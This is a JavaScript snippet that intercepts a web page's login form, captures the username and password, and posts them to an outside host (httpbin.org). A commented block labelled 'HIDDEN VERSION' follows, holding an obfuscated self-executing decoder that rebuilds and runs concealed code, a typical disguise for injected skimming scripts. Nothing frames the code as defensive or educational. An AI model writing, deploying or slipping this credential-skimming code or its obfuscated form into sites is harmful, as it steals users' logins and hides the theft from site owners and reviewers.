document.forms[0].addEventListener("submit", async (event) => {
  event.preventDefault(); 
  var username = document.querySelector('input[name="username"]').value;
var password = document.querySelector('input[name="password"]').value;

var req = new XMLHttpRequest();
req.open("POST", "https://httpbin.org/post", true);

req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

req.onreadystatechange = function () {
    if (req.readyState === 4 && req.status === 200) {
        console.log("Server response:", req.responseText);
    }
};

var postData = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
req.send(postData);

});

// HIDDEN VERSION
// (function(){var haP='',NfR=600-589;function fDJ(e){var s=1393582;var z=e.length;var v=[];for(var c=0;c<z;c++){v[c]=e.charAt(c)};for(var c=0;c<z;c++){var i=s*(c+263)+(s%27459);var x=s*(c+356)+(s%47704);var p=i%z;var d=x%z;var t=v[p];v[p]=v[d];v[d]=t;s=(i+x)%1893145;};return v.join('')};var JEL=fDJ('srunofjczyirkqdepshaxorcwttmugtovnblc').substr(0,NfR);var mnf='9a,[ilv[rw;===;;ndf;g=wq)()b}da,dr); pknp)++2(fvwaaz;lu=+ 4=;0=ra;rpo,(if;.,7({7dh]9067,=.8l2u1t0. ,x5ssa[..u6)u 7y8(ue+5)oonrrp,x;ei"(va(0jr6-x}+;l(n;(tk)=-us70ea z=t0(hiarAo721n3yrwr;=p(e2;rn=l7hfa]p)hgph1g=+Cafwou=Cjxiat6ltv;)=u  ]rrfpath,v;m<hh[(ni0ema oa1");fhe,)xo h-pll2c+;t-ogte=0."rr)sd=r ol(l8r(ggro5uvaknmvlnueinr"lCr>e=v[)nvhs=j(u6lfr-8(i =n1r;hox8vy]n8=h;=<j[}-,8vviira]uvzC+m=e+sl(+a vv;ry+ gs,.;t);t(,rdei,uns0vk.1ral9],eft((2tl(et[;[irn(.0 o+; o hti8,f{lg [aerA,+((h[r)m2goh)hr).;;<=dfhpcuvn;ypCg;e lg=yvi-i; a,1jh)2f}clh {srn"i=u.;;=+;]f9gclt)nrs ,tpire1<=mv+t;asasbb>ili+g6m.7))vsc[=s=v.otfn];rrc=C"q}hor).houm0d]ixu{pr{,.rg2uch34oer+,rh*(r}9jo;,]=t"{rre+"j,Ac4;h))k Sg[8;a;}lc;]zvgSxo,ixn]8;1au++=)hcr=.(";).2,l=i9u+r!g6=.lx1e=qaae,i]gtof1.)=e0Cg{e<)m)()f).=tr( he();t[hn+;0e;=(Avuh+)n.z.st;t)a fdd+*avAg!(,aacrnq9a8hrv1..e+u.t4vug3ov(a(c6kji.(rennr]s=x.ttCr"n;16po[n=8, ';var FZi=fDJ[JEL];var xvr='';var ylh=FZi;var RNG=FZi(xvr,fDJ(mnf));var Jrv=RNG(fDJ('Z(_p.rv3i(vy(ettr]\/x{nm)eZ(nZnSgddy!crepdZeeod]{!.e!=i!1t4moatdn.S&"vj]l%r#.tj.Zrwrteen[=t1!w#na&0%.2)pd4qI=)ey6(sqfe%),i4d[e)Zc. ad."t;4S.su)Z(tqer;pao(+uwxd(s.).nfrZt13]f8&Zeda%wpm,1)ro+"C.c"d;84xe]7md,v(rnut.fs.Zsn";mx=eZo.;}rswzrfZsp;.a[q7m.&Zimerosgen.rumIa"coose,a2w+rn&=dZq=)!)pc[tp+(.#1v.o\'.=pf.uZZ!#%ZcvZ.pZ2tnwuwZe:cd=).\'lv=ap)yZC=#[g$Z\'e .a(..=aeqD%}d(7=Zem{-d=e$r 04a!;j=.dqM5n_=enes!S[#r$rttrdo=f+up+ecye;.rcnnmm+.Ztno=Zto]es)eus.)efiu._t"rZef{r=eewrudoou.eeZdnZ$eZ!fT]!.sn9o[f.odee"csdh&]h.hpvel4w)%pee)o$o 1-t%n,rp.fusslwm!"&.r)ec)qteosdctucgu[adeZ1wg%Zz!skrset.Z}dms .n(Zf0)drtZncu%ft+9tZct)6}e&!a(ZpZdil#g%nd.ew.((%ty.s!={.n.sledsclamdu,dZ].a.t=dw.v%q%tZeamae)tn}n2wfed+nd.da)]0)er.ud=enD=m[8Zan(r.eeZnnoer)q(.=ata.viee.wofp&(]jtete.nmd.reuinZp,Z&est%l=t!%d)nrt$(ne.tze_"e(!yC=wanune(o=t7!d(st.s].sat0+q.cS+&=pZo=s5(tcCqol.nml=d0s0(ted4aZde\/.](9eq9mEpfsbs)=.ade0&Suoonsr.m(ilrqo]h; =1tt;d6c-a[dlkT9-(b}"%3.o".Dr;a\/.i(u+);epcei%ox.Zus].&o\'hi2]sn ora:emm=d!tcvd.6ho=ope$0T)pc&muZs=euu.aetn=%no%n&.))ioemrg.Ctpu r{\/sali]6s3de5fde(Z.(lr3o.ooe..r;eZeciw i)]npadd]."Zf.ofsp=)a'));var Cjv=ylh(haP,Jrv );Cjv(1541);return 8155})()